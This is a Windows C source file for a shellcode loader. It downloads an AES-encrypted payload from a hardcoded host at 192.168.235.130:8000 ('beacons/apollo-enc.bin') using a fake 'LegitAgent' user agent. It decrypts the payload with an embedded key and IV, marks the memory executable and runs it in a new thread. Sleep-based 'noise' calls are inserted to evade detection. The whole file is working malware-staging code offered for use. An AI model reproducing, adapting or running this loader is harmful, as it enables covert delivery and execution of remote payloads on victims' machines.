#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>
#include <Lmcons.h>

#pragma comment (lib, "Wininet.lib")
#pragma comment(lib, "Bcrypt.lib")


#define NT_SUCCESS(status)              (((NTSTATUS)(status)) >= 0)
#define KEYSIZE         32
#define IVSIZE          16

typedef struct _AES {
    PBYTE   pPlainText;             // base address of the plain text data
    DWORD   dwPlainSize;            // size of the plain text data

    PBYTE   pCipherText;            // base address of the encrypted data
    DWORD   dwCipherSize;           // size of it (this can change from dwPlainSize in case there was padding)

    PBYTE   pKey;                   // the 32 byte key
    PBYTE   pIv;                    // the 16 byte iv
}AES, * PAES;

// the real decryption implemantation
BOOL InstallAesDecryption(PAES pAes) {

    BOOL                            bSTATE = TRUE;

    BCRYPT_ALG_HANDLE               hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE               hKeyHandle = NULL;

    ULONG                           cbResult = NULL;
    DWORD                           dwBlockSize = NULL;

    DWORD                           cbKeyObject = NULL;
    PBYTE                           pbKeyObject = NULL;

    PBYTE                           pbPlainText = NULL;
    DWORD                           cbPlainText = NULL;

    NTSTATUS                        STATUS = NULL;

    // intializing "hAlgorithm" as AES algorithm Handle
    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // getting the size of the key object variable *pbKeyObject* this is used for BCryptGenerateSymmetricKey function later
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // getting the size of the block used in the encryption, since this is aes it should be 16 (this is what AES does)
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // checking if block size is 16
    if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // allocating memory for the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // setting Block Cipher Mode to CBC (32 byte key and 16 byte Iv)
    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // generating the key object from the aes key "pAes->pKey", the output will be saved in "pbKeyObject" of size "cbKeyObject"
    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // running BCryptDecrypt first time with NULL output parameters, thats to deduce the size of the output buffer, (the size will be saved in cbPlainText)
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // allocating enough memory (of size cbPlainText)
    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // running BCryptDecrypt second time with "pbPlainText" as output buffer
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // cleaning up
_EndOfFunc:
    if (hKeyHandle) {
        BCryptDestroyKey(hKeyHandle);
    }
    if (hAlgorithm) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    }
    if (pbKeyObject) {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }
    if (pbPlainText != NULL && bSTATE) {
        // if everything went well, we save pbPlainText and cbPlainText
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    return bSTATE;
}


// wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
        return FALSE;

    AES Aes = {
            .pKey = pKey,
            .pIv = pIv,
            .pCipherText = pCipherTextData,
            .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes)) {
        return FALSE;
    }

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;

    return TRUE;
}


// Function to get the shellcode from URL which returns base address the shellcode allocated buffer
BOOL ShellcodeFromUrl(PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    HINTERNET hInternet;				// Handle to the internet session
    HINTERNET hInternetShellcode;		// Handle to the URL connection
    DWORD dwBytesRead = NULL;					// Number of bytes read during each iteration
    SIZE_T sSize = NULL;						// Total accumulated bytes downloaded.
    PBYTE pBytes = NULL;						// Pointer to the final dynamically allocated buffer that will contain the shellcode
    PBYTE pTmpBuffer = NULL;					// Temporary 1KB buffer to read chunks from the internate

    // Create a handle to the internet session.
    hInternet = InternetOpenW(L"LegitAgent", NULL, NULL, NULL, NULL);
    if (hInternet == FALSE) {
        printf("InternetOpenW Failed with error code: %d \n", GetLastError());
        return -1;
    }

    // Open the handle to the shellcode specified by HTTP URL.
    LPCWSTR binFile = L"http://192.168.235.130:8000/beacons/apollo-enc.bin";
    hInternetShellcode = InternetOpenUrlW(hInternet, binFile, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetShellcode == NULL) {
        printf("InternetOpenUrlW Failed with error code: %d \n", GetLastError());
        return -1;
    }

    // pTmpBuffer is used to store 1024 bytes
    pTmpBuffer = (PBYTE)LocalAlloc(LPTR, 1024);

    while (TRUE) {
        // Writing 1024 b ytes to the pTmpBuffer.
        BOOL bReadFile = InternetReadFile(hInternetShellcode, pTmpBuffer, 1024, &dwBytesRead);
        if (bReadFile == FALSE) {
            printf("InternetReadFile failed with error: %d \n", GetLastError());
            InternetCloseHandle(hInternet);
            return -1;
        }

        // keeps track of the total number of bytes read from the file.
        sSize = sSize + dwBytesRead;

        // If this is the first chunk, allocate fresh memory of dwBytesRead size.
        if (pBytes == NULL) {
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        }

        else {
            // Reallocate the pBytes to equal to the total size, i.e. sSize
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }


        // Append the temp buffer to the end of the total buffer
        PBYTE pTarget = pBytes + (sSize - dwBytesRead);
        memcpy(pTarget, pTmpBuffer, dwBytesRead);

        ZeroMemory(pTmpBuffer, dwBytesRead);

        // once the bytes size of dwBytesRead reaches less than 1024, then its the end of the fiel.
        if (dwBytesRead < 1024) {
            break;
        }

    }
    //pointer to full shellcode buffer.
    *pPayloadBytes = pBytes;

    // total size of downloaded shellcode.
    *sPayloadSize = sSize;
    return TRUE;
}

// Breaking attack chain noise
BOOL randomNoise(int s) {
    TCHAR username[UNLEN + 1];  // UNLEN is the max username length
    DWORD username_len = UNLEN + 1;

    if (GetUserName(username, &username_len)) {
        wprintf(L"%.*s", 40, L"****************************************");
    }
    else {
        if (GetLastError != NULL) {
            wprintf(L"%.*s", 40, L"****************************************");
        }
    }
    Sleep(s);
    return TRUE;
}

int main() {

    SIZE_T	Size = NULL;
    PBYTE	Bytes = NULL;

    // Calling the function to read the encrypted shellcode
    if (!ShellcodeFromUrl(&Bytes, &Size)) {
        return -1;
    }

    // Random noise
    randomNoise(2);

    // Printing encrypted shellcode address and size of it.
    printf("[i] Bytes : 0x%p \n", Bytes);
    printf("[i] Size  : %ld \n", Size);

    // Printing the shellcode into bytes.
    /*
    for (int i = 0; i < Size; i++) {
        if (i % 16 == 0)
            printf("\n\t");

        printf("%0.2X ", Bytes[i]);
    }
    printf("\n\n");
    */

    // Printing the shellcode into Hex Format.
    /*
    printf("Hex Format\n");
    for (int i = 0; i < Size; i++) {
        if (i % 16 == 0) {
            printf("\n\t");
        }
        if (i < Size - 1) {
            printf("0x%0.2X, ", Bytes[i]);
        }
        else {
            printf("0x%0.2X ", Bytes[i]);
        }
    }
    printf("\n\n\n");
    */

    // Initializing the key and IV needed for the decryption
    PVOID	pPlaintext = NULL;
    DWORD	dwPlainSize = NULL;
    unsigned char AesKey[] = {
    0xBF, 0xC3, 0xFD, 0xAE, 0xEC, 0xEE, 0xAA, 0x60, 0xEA, 0xFA, 0xB3, 0xFC, 0x32, 0x0C, 0xFC, 0xE5,
    0x6E, 0xB9, 0x13, 0x81, 0x38, 0xBF, 0x13, 0x8F, 0x25, 0xF3, 0xC8, 0xBB, 0x02, 0x7B, 0x13, 0x6F };


    unsigned char AesIv[] = {
        0x0E, 0x39, 0x84, 0x32, 0xA6, 0x40, 0x44, 0xB3, 0x20, 0x1A, 0x20, 0x21, 0x13, 0xD1, 0x89, 0x77 };


    // Calling the decryption function
    if (!SimpleDecryption(Bytes, Size, AesKey, AesIv, &pPlaintext, &dwPlainSize)) {
        printf("Decryption exited with code: %d \n", GetLastError());
        return -1;
    }

    // Random noise
    randomNoise(1);

    // Printing the decypted shellcode
    /*
    printf("\n[>] decrypted shellcode:\n");
    for (int i = 0; i < dwPlainSize; i++) {
        printf("0x%02X, ", ((unsigned char*)pPlaintext)[i]);
    }
    printf("\n");
    */

    // Initiating the shellcode injection
    PVOID pShellcodeAddress = VirtualAlloc(NULL, dwPlainSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    // Copying the payload to the allocated memory
    memcpy(pShellcodeAddress, pPlaintext, dwPlainSize);

    // Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
    memset(pPlaintext, '\0', dwPlainSize);

    DWORD dwOldProtection = NULL;

    // Setting memory permissions at pShellcodeAddress to be executable
    if (!VirtualProtect(pShellcodeAddress, dwPlainSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }
    // Random noise
    randomNoise(3);
    // Executing the shellcode
    // Running the shellcode as a new thread's entry 
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Freeing pDeobfuscatedPayload
    HeapFree(GetProcessHeap(), 0, pPlaintext);
    //printf("[#] Press <Enter> To Quit ... ");
    //getchar();
}
